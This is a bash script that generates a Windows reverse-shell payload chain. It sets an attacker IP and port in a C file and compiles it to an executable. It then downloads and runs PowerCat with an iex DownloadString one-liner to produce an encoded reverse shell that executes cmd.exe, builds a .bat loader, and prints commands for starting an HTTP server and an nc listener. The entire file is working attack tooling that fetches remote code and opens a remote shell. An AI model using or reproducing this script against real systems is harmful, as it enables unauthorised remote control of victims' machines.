#!/bin/bash

IP_ADDRESS=$1
WEB_PORT=$2
REV_PORT=$3
RSHELL="shell-25.txt"

rm -rf $RSHELL
rm -rf payload.c 
rm -rf payload.exe
rm -rf payload.bat

cp sample.c payload.c

echo "[+] Generating payload to be hosted on ${IP_ADDRESS}:${WEB_PORT}..."
sed -i "s/host/${IP_ADDRESS}/g" payload.c
sed -i "s/port/${WEB_PORT}/g" payload.c

echo "[+] Compiling payload.c into PE32 executable..."
/usr/bin/i686-w64-mingw32-gcc payload.c -o payload.exe

echo "[+] Downloading PowerCat..."
echo "[+] Generating encoded payload from PowerCat..."
pwsh -c "iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c $IP_ADDRESS -p $REV_PORT -e cmd.exe -ge" > $RSHELL

cp sample.bat payload.bat
echo "[+] Generating final payload (.bat) ..."
sed -i "s/host/${IP_ADDRESS}/g" payload.bat
sed -i "s/port/${WEB_PORT}/g" payload.bat
sed -i "s/payload/${RSHELL}/g" payload.bat

echo "=============== Exploitation ================================"
echo "Set up web listener on port ${WEB_PORT}: python3 -m http.server ${WEB_PORT}"
echo "Set up reverse shell listener on port ${REV_PORT}: nc -nlvp ${REV_PORT}"
